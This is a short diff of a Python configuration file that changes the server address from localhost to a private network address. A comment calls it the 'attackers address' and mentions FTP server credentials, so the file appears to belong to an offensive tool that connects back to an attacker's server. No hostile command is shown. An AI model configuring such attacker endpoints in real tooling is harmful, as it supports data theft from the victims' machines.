@@ -1,7 +1,7 @@
 import os 
 
 # attackers address, you can write a method that retrieves this "sensitive "credentials in this case lets keep it simple & insecure
-SERVER_ADDR="127.0.0.1"
+SERVER_ADDR="192.168.8.162"
 SERVER_PORT=9999 
 
 # FTP server credentials
